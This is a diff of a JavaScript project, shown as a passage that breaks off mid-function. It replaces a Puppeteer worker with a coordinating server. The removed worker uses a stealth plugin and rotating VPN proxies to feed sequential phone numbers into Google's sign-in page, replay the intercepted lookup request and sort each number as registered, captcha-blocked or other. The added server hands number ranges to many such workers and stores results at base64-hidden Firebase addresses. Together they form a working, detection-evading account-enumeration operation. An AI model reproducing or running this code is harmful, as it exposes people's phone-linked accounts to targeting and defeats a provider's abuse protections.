@@ -1,772 +1,1219 @@
-const StealthPlugin = require('puppeteer-extra-plugin-stealth')
-const HttpsProxyAgent = require('https-proxy-agent')
-const puppeteer = require('puppeteer-extra')
-const {CookieJar} = require('tough-cookie')
-const {execFile} = require('child_process')
-const {promisify} = require('util')
+const bodyParser = require('body-parser')
+const express = require('express')
+const WebSocket = require('ws')
 const axios = require('axios')
-const path = require('path')
-const http = require('http')
-const tls = require('tls')
-const got = require('got')
 const fs = require('fs')
 
+const app = express()
+app.use(bodyParser.json())
 
-let USER = process.argv.slice(2)[0]
-let ENC_KEY = process.argv.slice(2)[1]
-let ENC_IV = process.argv.slice(2)[2]
+app.listen(8086, () => console.log('Founder Server Running...'))
 
-let mConfig = null
-let page = null
-let mPendingData = 0
-let mProxyLimit = 0
-let mCookiesJar = null
-let mNumberTask = null
-let mStart = Date.now()
-let isFirstRequest = true
-let pendingResolvers = []
-let mProxyList = []
-let mCapture = []
-let mDelayControll = []
+let mStart = new Date().toString()
 
-let STORAGE = decode('aHR0cHM6Ly9maXJlYmFzZXN0b3JhZ2UuZ29vZ2xlYXBpcy5jb20vdjAvYi9kYXRhYmFzZTA4OC5hcHBzcG90LmNvbS9vLw==')
+let LOAD_WORKER = 10
+let FIXED_PER_USER = 10
+let SHARE_PER_USER = 0
+let LOAD_PER_SERVER = 50
 
+let servers = new Map()
+let users = new Map()
+let queue = []
+let pendings = []
+let mUserName = {}
+let userLocks = new Map()
+let requestNumber = new Map()
+let sendCheck = new Set()
 
-class Proxy {
-    static CONFIG = {
-        workDir: '.vpn-work',
-        imageName: 'vpn-proxy',
-        containerPrefix: 'openvpn-',
-        connectTimeoutSec: 120,
-        testTimeoutMs: 20000,
-        testHost: 'api.ipify.org',
-    }
+let mConnection = null
+let reconnecting = false
+let lastSave = 0
 
-    constructor() {
-        fs.mkdirSync(path.resolve(Proxy.CONFIG.workDir), { recursive: true })
-    }
+let TARGET_BLOCK = 10000000
 
-    static sleep(ms) {
-        return new Promise((r) => setTimeout(r, ms))
-    }
+let BASE_URL = decode('aHR0cHM6Ly9kYXRhYmFzZTA4OC1kZWZhdWx0LXJ0ZGIuZmlyZWJhc2Vpby5jb20vUlJNVFNLQlJNUy8=')
+let SERVER_URL = decode('aHR0cHM6Ly9zZXJ2ZXItOTA5OS1kZWZhdWx0LXJ0ZGIuZmlyZWJhc2Vpby5jb20vUlJNVFNLQlJNUy8=')
 
-    static async execFileP(cmd, args, opts = {}) {
-        let fn = promisify(execFile)
-        let { stdout } = await fn(cmd, args, { maxBuffer: 20 * 1024 * 1024, ...opts })
-        return stdout
-    }
 
-    static async docker(args, opts = {}) {
-        return await Proxy.execFileP('docker', args, opts)
-    }
+setInterval(async () => {
+    await serverDataInit()
+}, 3600000)
 
-    static getIpViaProxy(port, timeoutMs) {
-        return new Promise((resolve, reject) => {
-            let host = Proxy.CONFIG.testHost
-            let req = http.request({
-                host: '127.0.0.1',
-                port,
-                method: 'CONNECT',
-                path: `${host}:443`,
-                timeout: timeoutMs,
-            })
+startServer()
 
-            req.on('timeout', () => req.destroy(new Error('proxy connect timeout')))
-            req.on('error', reject)
+async function startServer() {
 
-            req.on('connect', (res, socket) => {
-                if (res.statusCode !== 200) {
-                    socket.destroy()
-                    return reject(new Error(`CONNECT failed: HTTP ${res.statusCode}`))
-                }
-                let secure = tls.connect({ socket, servername: host }, () => {
-                    secure.write(`GET / HTTP/1.0\r\nHost: ${host}\r\nConnection: close\r\n\r\n`)
-                })
-                let data = ''
-                secure.setTimeout(timeoutMs, () => secure.destroy(new Error('TLS/response timeout')))
-                secure.on('data', (c) => (data += c))
-                secure.on('error', reject)
-                secure.on('end', () => {
-                    let cleanData = data.trim()
-                    
-                    let ipMatch = cleanData.match(/(?:\r\n\r\n|\n\n|^)([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}|[0-9a-fA-F:]+)/)
-                    let ip = ipMatch ? ipMatch[1].trim() : cleanData.replace(/[^0-9a-fA-F.:]/g, '').trim()
+    await loadOldData()
+    
+    await serverDataInit()
 
-                    if (ip && (ip.includes('.') || ip.includes(':'))) {
-                        resolve(ip)
-                    } else {
-                        reject(new Error('unexpected response: ' + cleanData.slice(0, 80)))
-                    }
-                })
-            })
+    mUserName = await readUserName()
+    
+    await runWebSocket('wss://database.raiyanbd.com')
 
-            req.end()
-        })
-    }
+    await runPrevServer()
 
-    async buildImage() {
-        if (process.platform !== 'linux') {
-            return
-        }
-        let dir = path.resolve(Proxy.CONFIG.workDir)
-        fs.writeFileSync(
-            path.join(dir, 'Dockerfile'),
-            'FROM alpine:latest\nRUN apk add --no-cache openvpn curl iproute2 tinyproxy\n'
-        )
-        fs.writeFileSync(
-            path.join(dir, 'tinyproxy.conf'),
-            ['Port 8888', 'Listen 0.0.0.0', 'Timeout 600', 'Allow 0.0.0.0/0', 'DisableViaHeader Yes', 'LogLevel Info', 'MaxClients 50', ''].join('\n')
-        )
-        await Proxy.docker(['build', '-q', '-t', Proxy.CONFIG.imageName, dir])
-    }
-
-    async connect(ovpnContentString, port, index = 1) {
-        let name = `${Proxy.CONFIG.containerPrefix}${index}`
-        let startTime = Date.now()
-        let result = {
-            name,
-            port,
-            status: false,
-            ip: null,
-            time: 0,
-            error: null,
-        }
-
-        if (process.platform !== 'linux') {
-            return result
-        }
-
-        let tempOvpnPath = path.resolve(Proxy.CONFIG.workDir, `client-${index}.ovpn`)
-
-        try {
-            await Proxy.docker(['stop', name]).catch(() => {})
-            await Proxy.docker(['rm', '-f', name]).catch(() => {})
-
-            fs.writeFileSync(tempOvpnPath, ovpnContentString)
-
-            await Proxy.docker([
-                'run', '-d',
-                '--name', name,
-                '--privileged',
-                '--cap-add=NET_ADMIN',
-                '--device', '/dev/net/tun',
-                '--dns', '8.8.8.8', '--dns', '1.1.1.1',
-                '-p', `127.0.0.1:${port}:8888`,
-                '-v', `${tempOvpnPath}:/etc/openvpn/client.ovpn:ro`,
-                '-v', `${path.resolve(Proxy.CONFIG.workDir, 'tinyproxy.conf')}:/etc/tinyproxy/custom.conf:ro`,
-                Proxy.CONFIG.imageName,
-                'openvpn', '--config', '/etc/openvpn/client.ovpn',
-            ])
-
-            let deadline = Date.now() + Proxy.CONFIG.connectTimeoutSec * 1000
-            let connected = false
-            
-            while (Date.now() < deadline) {
-                let rawLogs = await Proxy.execFileP('docker', ['logs', name]).catch(() => '')
-                
-                if (rawLogs.includes('Initialization Sequence Completed')) {
-                    connected = true
-                    break
-                }
-                
-                let running = (await Proxy.docker(['inspect', '-f', '{{.State.Running}}', name])).trim()
-                if (running !== 'true') throw new Error('Container exited early')
-                await Proxy.sleep(2000)
-            }
-
-            if (!connected) throw new Error('VPN connection timeout')
-
-            await Proxy.docker(['exec', name, 'sh', '-c', 'printf "nameserver 1.1.1.1\\nnameserver 8.8.8.8\\n" > /etc/resolv.conf'])
-            await Proxy.docker(['exec', '-d', name, 'tinyproxy', '-d', '-c', '/etc/tinyproxy/custom.conf'])
-            await Proxy.sleep(2000)
-
-            let proxyIp = await Proxy.getIpViaProxy(port, Proxy.CONFIG.testTimeoutMs)
-
-            result.status = true
-            result.ip = proxyIp
-            result.time = Number(((Date.now() - startTime) / 1000).toFixed(2))
-        } catch (error) {
-            result.error = error.message
-            result.time = Number(((Date.now() - startTime) / 1000).toFixed(2))
-        }
-
-        return result
-    }
-
-    async cleanup(name) {
-        await Proxy.docker(['stop', name]).catch(() => {})
-        await Proxy.docker(['rm', '-f', name]).catch(() => {})
-    }
-}
-
-class AdaptiveDelay {
-    constructor({minDelay = 1000, maxDelay = 2000, step = 200, incCooldown = 5000, decCooldown = 30000 } = {}) {
-        this.delay = minDelay
-        this.minDelay = minDelay
-        this.maxDelay = maxDelay
-        this.step = step
-
-        this.incCooldown = incCooldown
-        this.decCooldown = decCooldown
-
-        this.lastIncTime = 0
-        this.lastDecTime = 0
-
-        this.lastSignalCount = 0
-        this.lastSignalTime = 0
-    }
-
-    update(signalCount) {
-        if (signalCount == 0) {
-            return this.delay
-        }
-
-        let now = Date.now()
-
-        if (signalCount > this.lastSignalCount) {
-            if (now - this.lastIncTime < this.incCooldown) {
-                return this.delay
-            }
-
-            this.delay = Math.min(this.delay + this.step, this.maxDelay)
-            this.lastIncTime = now
-        } else {
-            if (now - this.lastDecTime < this.decCooldown) {
-                return this.delay
-            }
-
-            this.delay = Math.max(this.delay - this.step, this.minDelay)
-            this.lastDecTime = now
-        }
-
-        this.lastSignalCount = signalCount
-        this.lastSignalTime = now
-
-        return this.delay
-    }
-}
-
-class SharedQueue {
-    constructor(maxSize = 100) {
-        this.queue = []
-        this.waitingResolvers = []
-        this.maxSize = maxSize
-        this.count = 0
-    }
-
-    addData(data) {
-        if (this.queue.length >= this.maxSize) {
-            return false
-        }
-
-        if (this.waitingResolvers.length > 0) {
-            let resolve = this.waitingResolvers.shift()
-            resolve(data)
-        } else {
-            this.queue.push(data)
-        }
-        return true
-    }
-
-    async getNumber() {
-        if (this.count >= this.maxSize) {
-            return null
-        }
-
-        if (this.queue.length > 0) {
-            this.count++
-            return this.queue.shift()
-        }
-
-        return new Promise((resolve) => {
-            this.waitingResolvers.push((data) => {
-                if (this.count >= this.maxSize) {
-                    resolve(null)
-                } else {
-                    this.count++
-                    resolve(data)
-                }
-            })
-        })
-    }
-
-    size() {
-        return this.queue.length
-    }
-
-    getCount() {
-        return this.count
-    }
-}
-
-puppeteer.use(StealthPlugin())
-
-
-let mProxyManager = new Proxy()
-
-
-process.on('message', async (data) => {
-    try {
-        let json = (typeof data === 'string') ? JSON.parse(data) : data
-        if (json.t == 1) {
-            mConfig = json
-        } else if (json.t == 2) {
-            let running = mConfig != null
-            process.send({ t: 3, s: 'controller_status', d: { t:2, r:running, u:json.u, s:USER, a:parseInt((Date.now()-mStart)/1000) } })
-        }
-    } catch (error) {}
-})
-
-
-startBrowser()
-
-
-async function startBrowser() {
-    await mProxyManager.buildImage()
-    mCapture.push(0)
-    mDelayControll.push(new AdaptiveDelay({ minDelay:1000, maxDelay:2000 }))
-
-    let vpnConfig = await getVpnConfig(USER, ENC_KEY, ENC_IV)
-
-    if(vpnConfig) {
-        console.log('--------------------------------')
-        mProxyLimit = vpnConfig.length
-
-        for (let i = 0; i < vpnConfig.length; i++) {
-            mCapture.push(0)
-            mDelayControll.push(new AdaptiveDelay({ minDelay:1000, maxDelay:2000 }))
-            let result = await mProxyManager.connect(vpnConfig[i].config, 8888+i, i+1)
-            if (result.status) {
-                let proxy = 'http://127.0.0.1:'+result.port
-                mProxyList.push({ proxy })
-                console.log('Proxy Name: '+result.name)
-                await checkProxyWithAxios(proxy)
-                console.log('Load Time: '+result.time+'s')
-                console.log('--------------------------------')
-            } else {
-                mProxyList.push({
-                    proxy: null
-                })
-                console.log('Proxy Name: '+result.name)
-                console.log('Error Msg: '+result.error)
-                console.log('Load Time: '+result.time+'s')
-                console.log('--------------------------------')
-            }
-        }
-    }
-
-    try {
-        let browser = await puppeteer.launch({
-            headless: false,
-            headless: 'new',
-            args: [
-                '--no-sandbox',
-                '--disable-notifications',
-                '--disable-setuid-sandbox',
-                '--ignore-certificate-errors',
-                '--ignore-certificate-errors-skip-list',
-                '--disable-dev-shm-usage'
-            ]
-        })
-
-        page = (await browser.pages())[0]
-
-        page.on('dialog', async dialog => dialog.type() == "beforeunload" && dialog.accept())
-
-        await page.setRequestInterception(true)
-
-        page.on('request', async request => {
-            try {
-                let url = request.url()
-                if (url.startsWith('https://accounts.google.com/v3/signin/_/AccountsSignInUi/data/batchexecute?rpcids=MI613e')) {
-                    loginDataProcess(url, request.headers(), request.postData())
-                    
-                    let contentType = 'application/json; charset=utf-8'
-                    let output = decode('KV19JwoKMTk1CltbIndyYi5mciIsIlYxVW1VZSIsIltudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsWzExXV0iLG51bGwsbnVsbCxudWxsLCJnZW5lcmljIl0sWyJkaSIsNThdLFsiYWYuaHR0cHJtIiw1OCwiLTI1OTg0NDI2NDQ4NDcyOTY2MTMiLDY1XV0KMjUKW1siZSIsNCxudWxsLG51bGwsMjMxXV0K')
-
-                    request.respond({
-                        ok: true,
-                        status: 200,
-                        contentType,
-                        body: output,
-                    })
-                } else {
-                    request.continue()
-                }
-            } catch (error) {
-                request.continue()
-            }
-        })
-
-        console.log('Browser Load Success')
-
-        await loadLoginPage()
-
-        console.log('Page Load Success')
-        
-        await foundLoginNumber()
-    } catch (error) {
-        console.log('Browser Error: '+error)
-    }
-}
-
-async function foundLoginNumber() {
     while (true) {
-        if (mConfig) {
-            mStart = Date.now()
-            
+        for (let i = 0; i < 10; i++) {
             try {
-                let target = mConfig.s
-                let worker = Math.min(mConfig.b, mProxyLimit)+1
+                if (queue.length > 0) {
+                    let req = queue.shift()
+                    let user = String(req.user)
+                    let addNew = true
+                    if (users.has(user)) {
+                        try {
+                            let u = users.get(user)
 
-                mNumberTask = new SharedQueue(target)
-                
-                mPendingData = 0
-
-                for (let i = 0; i < worker; i++) {
-                    let number = mConfig.n+i
-                    await setLoginRequest(number.toString())
-                }
-
-                await waitForFirstStepFinish(worker)
-                seartNextNumberToken(mConfig.n, worker, target)
-
-                mCookiesJar = await getCookiesJar(page)
-
-                let result = await workerStart(worker, target)                
-
-                process.send({ t: 5, s: 'controller_status', c:USER, d: { t:1, u:mConfig.u, s:USER, f:result.f, r:result.r, c:result.c, o:result.o } })
-            } catch (error) {}
-
-            mConfig = null
-        } else {
-            await delay(1000)
-        }
-    }
-}
-
-async function workerStart(workerSize, target) {
-    let workers = []
-    let result = {
-        f: 0,
-        r: 0,
-        c: 0,
-        o: 0
-    }
-
-    let capture = {}
-    let timeoutMs = target * 3000
-
-    for (let i = 0; i < workerSize; i++) {
-        let workerId = i
-
-        let workerPromise = (async () => {
-            while (true) {
-                let task = await mNumberTask.getNumber()
-
-                if (task === null) {
-                    break
-                }
-
-                let status = await sendRequest(task, workerId)
-
-                if (status == 1) {
-                    result.f++
-                } else if (status == 2) {
-                    result.r++
-                } else if (status == 5) {
-                    result.c++
-                    mCapture[workerId] = (mCapture[workerId] || 0) + 1
-                    let workerKey = workerId.toString()
-                    capture[workerKey] = (capture[workerKey] || 0) + 1
-                } else if (status == 3 || status == 0) {
-                    result.o++
-                }
-
-                await delay(mDelayControll[workerId].update((mCapture[workerId] || 0)))
-            }
-        })()
-
-        workers.push(workerPromise)
-    }
-
-    let timeoutPromise = new Promise((resolve) => {
-        setTimeout(() => {
-            resolve(result)
-        }, timeoutMs)
-    })
-
-    await Promise.race([
-        Promise.all(workers),
-        timeoutPromise
-    ])
-
-    if (result.c > 0) {
-        console.log('Capture:', capture)
-    }
-
-    return result
-}
-
-async function waitForFirstStepFinish(target) {
-    if (mPendingData >= target) return
-
-    return new Promise((resolve) => {
-        let waiter = {
-            target: target,
-            resolve: resolve
-        }
-        pendingResolvers.push(waiter)
-
-        setTimeout(() => {
-            let index = pendingResolvers.indexOf(waiter)
-            if (index !== -1) {
-                pendingResolvers.splice(index, 1)
-                resolve()
-            }
-        }, Math.max(target * 400, 5000))
-    })
-}
-
-async function seartNextNumberToken(number, next, target) {
-    let currentNextNum = number + next
-    let processedCount = next
-
-    while (processedCount < target) {
-        mPendingData = 0
-
-        for (let i = 0; i < next; i++) {
-            if (processedCount >= target) break
-            let targetNumber = currentNextNum + i
-            await setLoginRequest(targetNumber.toString())
-            processedCount++
-        }
-
-        currentNextNum += next
-        await waitForFirstStepFinish(next)
-    }
-}
-
-async function setLoginRequest(number) {
-    try {
-        page.evaluate((number) => {
-            document.querySelector('input#identifierId').value = number
-            document.querySelector('#identifierNext').click()
-        }, '+'+number)
-
-        if (isFirstRequest) {
-            for (let i = 0; i < 20; i++) {
-                if(mPendingData > 0) {
-                    break
-                }
-                await delay(250)
-            }
-            isFirstRequest = false
-        }
-    } catch (error) {}
-}
-
-async function loginDataProcess(url, headers, postData) {
-    try {
-        let data = JSON.parse(JSON.parse(Object.fromEntries(new URLSearchParams(postData))['f.req'])[0][0][1])
-
-        let number = data[1].replace('+', '')
-
-        mPendingData++
-        mNumberTask.addData({ number, url, headers, postData })
-
-        if (pendingResolvers.length > 0) {
-            pendingResolvers = pendingResolvers.filter(waiter => {
-                if (mPendingData >= waiter.target) {
-                    waiter.resolve()
-                    return false
-                }
-                return true
-            })
-        }
-    } catch (error) {}
-}
-
-async function sendRequest(task, id) {
-    try {
-        let agent = undefined
-
-        if (id > 0) {
-            let proxyObj = mProxyList[id-1]
-
-            if (proxyObj && proxyObj.proxy) {
-                agent = {
-                    http: new HttpsProxyAgent(proxyObj.proxy),
-                    https: new HttpsProxyAgent(proxyObj.proxy)
-                }
-            }
-        }
-        
-        let headers = {
-            ...task.headers,
-            'accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
-            'host': 'accounts.google.com',
-            'sec-fetch-site': 'same-origin',
-            'sec-fetch-mode': 'no-cors',
-        }        
-
-        let options = {
-            cookieJar: mCookiesJar,
-            method: 'POST',
-            body: task.postData,
-            headers: headers,
-            agent: agent,
-            responseType: 'buffer',
-            maxRedirects: 15,
-            throwHttpErrors: false,
-            ignoreInvalidCookies: true,
-            followRedirect: false
-        }
-
-        for (let i = 0; i < 2; i++) {
-            try {
-                let response = await got(task.url, options)
-        
-                let data = response.body.toString()
-
-                let json = extractArrays(data)[0][0]
-
-                if (json[1] == 'MI613e') {
-                    let value = JSON.parse(json[2])
-                    
-                    if (value[21]) {
-                        let values = JSON.stringify(value[21])
-                        if (values.includes('/v3/signin/challenge/pwd') || values.includes('/v3/signin/rejected')) {
-                            return 1
-                        } else if (values.includes('/v3/signin/challenge/recaptcha')) {
-                            return 2
-                        } else {
-                            return 3
-                        }
-                    } else if (value[18] && value[18][0]) {
-                        return 5
+                            if (u.status !== 1) {
+                                let total = u.permanent.size + u.temporary.size
+                                if (total <= 0) {
+                                    users.delete(user)
+                                    addNew = true
+                                }
+                            }
+                        } catch (error) {}
                     } else {
-                        return 4
+                        addNew = true
+                    }
+
+                    if (addNew) {
+                        await saveRequestNumber(req)
+                        let assigned = await allocateForNewUser(req)
+                        if(assigned.length == 0) pendings.push(user)
+                        
+                        for (let wid of assigned) {
+                            await assignNextRangeToWorkerForUser(wid, user, false)
+                            await sleep(100)
+                        }
                     }
                 }
-            } catch (error) {
-                await delay(1000)
-            }
+            } catch (err) {}
+
+            await sleep(1000)
         }
-    } catch (error) {}
 
-    return 0
-}
+        clearPending(pendings)
+        await clearCompletedUser()
+        await saveData()
 
-async function loadLoginPage() {
-    for (let i = 0; i < 3; i++) {
         try {
-            await page.goto('https://accounts.google.com/ServiceLogin?service=accountsettings&continue=https://myaccount.google.com', { timeout: 60000 })
-            await delay(500)
-            await page.evaluate(() => {
-                let root = document.querySelector('div[class="kPY6ve"]')
-                if (root) {
-                    root.remove()
-                }
-                root = document.querySelector('div[class="Ih3FE"]')
-                if (root) {
-                    root.remove()
-                }
-            })
+            let runningUsers = getRunningUsers()
 
-            isFirstRequest = true
-            break
+            if (runningUsers.length > 0) {
+
+                await clearDeadServer()
+
+                let freeServer = getFreeServers()
+        
+                if (freeServer.length > 0) {
+                    let assignable = Math.min(freeServer.length, runningUsers.length)
+
+                    for (let i = 0; i < assignable; i++) {
+                        await assignNextRangeToWorkerForUser(freeServer[i].id, runningUsers[i].id, true)
+                        await sleep(100)
+                    }   
+                }
+            }
         } catch (error) {}
     }
 }
 
-async function getVpnConfig(user, key, iv) {
-    try {
-        let response = await axios.post('https://proxy.raiyanbd.com/get-vpn', { user, key, iv })
+function assignNextRangeToWorkerForUser(serverId, user, extra) {
+    return withUserLock(user, async () => {
+        let ent = users.get(String(user))
+        let s = servers.get(serverId)
 
-        if (response.data.success) {
-            return Object.entries(response.data.data).map(([ip, value]) => ({
-                ip,
-                ...value
-            }))
+        if (!ent || !s) {
+            if (s) {
+                s.running = false
+                s.user = null
+            }
+
+            if (ent) {
+                ent.permanent.delete(serverId)
+                ent.temporary.delete(serverId)
+            }
+            return await saveData()
         }
-    } catch (error) {}
-}
 
-async function checkProxyWithAxios(proxyUrl) {
-    try {
-        let agent = new HttpsProxyAgent(proxyUrl)
+        let number = ent.number
+        let lastLoad = number + LOAD_PER_SERVER
 
-        let response = await axios.get('https://api.ipify.org?format=json', {
-            httpAgent: agent,
-            httpsAgent: agent,
-            timeout: 10000
-        })
-        
-        console.log('IP Address:', response.data.ip)
-    } catch (error) {
-        console.log('IP Error:', error.message)
-    }
-}
+        if (number > ent.max || number > lastLoad) {
+            ent.c_time = Date.now()
+            ent.status = 2
+            s.running = false
+            s.temp = true
+            s.user = null
 
-function extractArrays(raw) {
-    raw = raw.replace(/^\)\]\}'\s*/g, '')
+            ent.permanent.delete(serverId)
+            ent.temporary.delete(serverId)
 
-    let lines = raw.split('\n')
-
-    let arrays = []
-
-    for (let i = 0; i < lines.length; i++) {
-        let line = lines[i].trim()
-
-        if (line.startsWith('[')) {
-            try {
-                arrays.push(JSON.parse(line))
-            } catch {}
+            await completedRequestNumber(ent)
+            return await saveData()
         }
-    }
 
-    return arrays
-}
+        if (ent.status !== 1) {
+            s.running = false
+            s.temp = true
+            s.user = null
 
-async function saveNumber(user, key, number) {
-    try {
-        await fetch(STORAGE+encodeURIComponent('number/'+user+'/'+key+'/'+number), {
-            method: 'POST',
-            body: ''
-        })
-    } catch (error) {}
-}
+            ent.permanent.delete(serverId)
+            ent.temporary.delete(serverId)
+            
+            return await saveData()
+        }
 
-async function getCookiesJar(page) {
-    let puppeteerCookies = await page.cookies()
+        if (extra) {
+            s.temp = true
+            ent.temporary.add(serverId)
+        }
 
-    let cookies = puppeteerCookies.map(cookie => ({
-        creation: new Date().toISOString(),
-        domain: cookie.domain.replace(/^\./, ''),
-        expires: cookie.expires === -1 ? Infinity : new Date(cookie.expires * 1000).toISOString(),
-        hostOnly: !cookie.domain.startsWith('.'),
-        httpOnly: cookie.httpOnly,
-        key: cookie.name,
-        lastAccessed: new Date().toISOString(),
-        path: cookie.path,
-        secure: cookie.secure,
-        value: cookie.value
-    }))
+        s.user = user
+        s.running = true
+        s.active = Date.now()
+        ent.number = lastLoad
 
-    return CookieJar.deserializeSync({
-        cookies,
-        rejectPublicSuffixes: true,
-        storeType: 'MemoryCookieStore',
-        version: 'tough-cookie@2.0.0'
+        let payload = { t: 4, s: serverId, d: { t:1, n:number, u:user, k:ent.key, s:LOAD_PER_SERVER, b:LOAD_WORKER } }
+
+        if (!sendToWS(payload, serverId)) {
+            ent.number = number
+            s.running = false
+        }
+
+        return await saveData()
     })
 }
+
+function clearPending(pendings) {
+    let seen = new Set()
+
+    for (let i = pendings.length - 1; i >= 0; i--) {
+        let uid = pendings[i]
+
+        if (seen.has(uid)) {
+            pendings.splice(i, 1)
+            continue
+        }
+        seen.add(uid)
+
+        if (!users.has(uid)) {
+            pendings.splice(i, 1)
+            continue
+        }
+
+        let u = users.get(uid)
+
+        if (u.permanent && u.permanent.size > 0) {
+            pendings.splice(i, 1)
+        }
+    }
+}
+
+
+async function clearCompletedUser() {
+    for (let [userId, u] of users.entries()) {
+        try {
+            if (u.status != 1) {
+                if (u.c_time+300000 < Date.now()) {
+                    let removeData = false
+                    if (u.permanent.size > 0) {
+                        for (let name of u.permanent) {
+                            try {
+                                let server = servers.get(name)
+                                if (server && server.user == userId) {
+                                    server.user = null
+                                    server.running = false
+                                    server.temp = true
+                                }
+                            } catch (error) {}
+                        }
+                        removeData= true
+                        u.permanent = new Set()
+                    }
+
+                    if(u.temporary.size > 0) {
+                        for (let name of u.temporary) {
+                            try {
+                                let server = servers.get(name)
+                                if (server && server.user == userId) {
+                                    server.user = null
+                                    server.running = false
+                                    server.temp = true
+                                }
+                            } catch (error) {}
+                        }
+                        removeData = true
+                        u.temporary = new Set()
+                    }
+
+                    if (removeData) {
+                        try {
+                            await axios.patch(BASE_URL+'number/'+userId+'/'+u.key+'.json', JSON.stringify({ s: u.start, e: u.number, f:u.found }), {
+                                headers: {
+                                    'Content-Type': 'application/x-www-form-urlencoded'
+                                }
+                            })
+                        } catch (error) {}
+                    }
+                }
+            }
+        } catch (error) {}
+    }
+}
+
+
+async function clearDeadServer() {
+    let deadList = getDeadServer()
+
+    for (let i = 0; i< deadList.length; i++) {
+        try {
+            let id = deadList[i].id
+            let server = servers.get(id)
+
+            if (server) {
+                let name = server.user
+            
+                if (name && users.get(name).status == 1) {
+                    sendToWS({ t: 4, s: id, d: { t:2, u:name } }, id)
+                    server.active = Date.now()
+                } else {
+                    server.running = false
+                    server.temp = true
+                    server.user = null
+                }
+            }
+        } catch (error) {}
+    }
+}
+
+async function handleWorkerMessage(user, serverId, found, captcha, recap, other) {
+    await withUserLock(user, async () => {
+        try {
+            if (!servers.has(serverId) || !users.has(user)) {
+                return
+            }
+            let s = servers.get(serverId)
+            let e = users.get(user)
+            e.found += found
+            e.captcha += captcha
+            e.recap += recap
+            e.other += other
+            
+            if (!s.temp && e.status === 1) {
+                let number = e.number
+                let lastLoad = number + LOAD_PER_SERVER
+
+                if (number > e.max || number > lastLoad) {
+                    e.c_time = Date.now()
+                    e.status = 2
+
+                    await completedRequestNumber(e)
+                    
+                    e.permanent.delete(serverId)
+                    e.temporary.delete(serverId)
+                } else {
+                    s.active = Date.now()
+                    e.number = lastLoad
+
+                    let payload = { t: 4, s: serverId, d: { t:1, n:number, u:user, k:e.key, s:LOAD_PER_SERVER, b:LOAD_WORKER } }
+                    
+                    if (!sendToWS(payload, serverId)) {
+                        e.number = number
+                        s.running = false
+                    }
+                    return await saveData()
+                }
+            }
+
+            if (e.status !== 1) {
+                s.temp = true
+            }
+
+            if (s.temp) {
+                let newUser = getUsersWithPendingPermanent()
+                
+                if (newUser) {
+                    e.permanent.delete(serverId)
+                    e.temporary.delete(serverId)
+                    
+                    let number = newUser.number
+                    let lastLoad = number + LOAD_PER_SERVER
+
+                    if (number > newUser.max || number > lastLoad) {
+                        if(newUser.status == 1) newUser.c_time = Date.now()
+                        newUser.status = 2
+
+                        newUser.permanent.delete(serverId)
+                        newUser.temporary.delete(serverId)
+
+                        await completedRequestNumber(newUser)
+                    } else {
+                        newUser.permanent.add(serverId)
+                        
+                        s.user = newUser.id
+                        s.temp = false
+                        s.active = Date.now()
+                        newUser.number = lastLoad
+
+                        clearPending(pendings)
+
+                        let payload = { t: 4, s: serverId, d: { t:1, n:number, u:newUser.id, k:newUser.key, s:LOAD_PER_SERVER, b:LOAD_WORKER } }
+                        
+                        if (!sendToWS(payload, serverId)) {
+                            newUser.number = number
+                            s.running = false
+                        }
+                        return await saveData()
+                    }
+                    return await saveData()
+                }
+
+                SHARE_PER_USER = sharePerUser(0)
+
+                let sameUser = false
+
+                if (SHARE_PER_USER > 0) {
+                    let newUser = getUsersWithPendingTempory()
+                
+                    if (newUser) {
+                        e.permanent.delete(serverId)
+                        e.temporary.delete(serverId)
+                        
+                        let number = newUser.number
+                        let lastLoad = number + LOAD_PER_SERVER
+
+                        if (number > newUser.max || number > lastLoad) {
+                            if(newUser.status == 1) newUser.c_time = Date.now()
+                            newUser.status = 2
+
+                            newUser.permanent.delete(serverId)
+                            newUser.temporary.delete(serverId)
+
+                            await completedRequestNumber(newUser)
+                        } else {
+                            newUser.temporary.add(serverId)
+
+                            s.user = newUser.id
+                            s.active = Date.now()
+                            newUser.number = lastLoad
+
+                            let payload = { t: 4, s: serverId, d: { t:1, n:number, u:newUser.id, k:newUser.key, s:LOAD_PER_SERVER, b:LOAD_WORKER } }
+                            
+                            if (!sendToWS(payload, serverId)) {
+                                newUser.number = number
+                                s.running = false
+                            }
+                            return await saveData()
+                        }
+                    } else {
+                        sameUser = e.status == 1
+                    }
+                } else {
+                    sameUser = e.status == 1
+                }
+
+                if (sameUser) {
+                    let number = e.number
+                    let lastLoad = number + LOAD_PER_SERVER
+
+                    if (number > e.max || number > lastLoad) {
+                        if(e.status == 1) e.c_time = Date.now()
+                        e.status = 2
+
+                        e.permanent.delete(serverId)
+                        e.temporary.delete(serverId)
+
+                        await completedRequestNumber(e)
+                    } else {
+                        s.active = Date.now()
+                        e.number = lastLoad
+
+                        let payload = { t: 4, s: serverId, d: { t:1, n:number, u:user, k:e.key, s:LOAD_PER_SERVER, b:LOAD_WORKER } }
+                        
+                        if (!sendToWS(payload, serverId)) {
+                            e.number = number
+                            s.running = false
+                        }
+                        return await saveData()
+                    }
+                }
+            }
+
+            s.user = null
+            s.running = false
+            e.permanent.delete(serverId)
+            e.temporary.delete(serverId)
+
+            await saveData()
+
+        } catch (error) {}
+
+        s.user = null
+        s.running = false
+
+        return await saveData()
+    })
+}
+
+function getUsersWithPendingPermanent() {
+    for (let user of users.values()) {
+        if (user.status === 1) {
+            if (Array.from(user.permanent).length < FIXED_PER_USER) {
+                return user
+            }
+        }
+    }
+    return null
+}
+
+function getUsersWithPendingTempory() {
+    for (let user of users.values()) {
+        if (user.status === 1) {
+            if (Array.from(user.temporary).length < SHARE_PER_USER) {
+                return user
+            }
+        }
+    }
+    return null
+}
+
+async function allocateForNewUser(req) {
+    let user = String(req.user)
+    let freePool = getFreeServers()
+    let fixed = []
+    let extra = []
+
+    for (let s of freePool) {
+        if (fixed.length >= FIXED_PER_USER) break
+        s.running = true
+        s.user = user
+        s.temp = false
+        s.active = Date.now()
+        fixed.push(s.id)
+    }
+
+    let freeLeft = getFreeServers()
+
+    if (freeLeft.length > 0) {
+        SHARE_PER_USER = sharePerUser(1)
+        
+        for (let s of freeLeft) {
+            if (extra.length >= SHARE_PER_USER) break
